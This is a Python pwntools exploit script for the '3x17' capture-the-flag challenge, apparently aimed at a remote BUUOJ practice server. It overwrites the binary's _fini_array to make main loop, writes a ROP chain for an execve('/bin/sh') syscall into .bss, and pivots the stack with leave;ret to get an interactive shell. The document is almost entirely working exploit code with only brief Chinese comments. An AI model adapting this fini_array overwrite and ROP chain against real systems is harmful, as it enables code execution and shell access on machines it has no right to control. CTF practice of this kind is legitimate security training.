#coding=utf-8
from pwn import *

#context.log_level="debug"
# p=process("./3x17")
p=remote("node4.buuoj.cn",27736)

# gdb.attach(p)

main = 0x401b6d
__libc_csu_fini = 0x402960
_fini_array = 0x4b40f0

#_fini_array
p.sendlineafter("addr:",str(_fini_array))
p.sendafter("data:",p64(__libc_csu_fini)+p64(main))

# 改成这样后程序会不断循环，flag的类型为 char 总会周期性的等于 1
# .bss:00000000004B9330 flag            db ?                    ; DATA XREF: sub_401B6D+17↑r
# .bss:00000000004B9330                                         ; sub_401B6D+21↑w ...
# .bss:00000000004B9331
# 之后在 bss 写上 rop 链再迁过去就行

#rop_chain
pop_rdi=0x401696
pop_rax=0x41e4af
pop_rdx_rsi=0x44a309
bin_sh_addr=0x4b4140
leave_ret = 0x401c4b

p.sendlineafter("addr:",str(0x4b4100))
p.sendafter("data:",p64(pop_rdi))
p.sendlineafter("addr:",str(0x4b4108))
p.sendafter("data:",p64(bin_sh_addr)+p64(pop_rax)+p64(0x3b))
p.sendlineafter("addr:",str(0x4b4120))
p.sendafter("data:",p64(pop_rdx_rsi)+p64(0)+p64(0))
p.sendlineafter("addr:",str(0x4b4138))
p.sendafter("data:",p64(0x446e2c)+"/bin/sh\x00")

#get_shell
# gdb.attach(p)
p.sendlineafter("addr:",str(_fini_array))
p.sendafter("data:",p64(leave_ret))
p.interactive()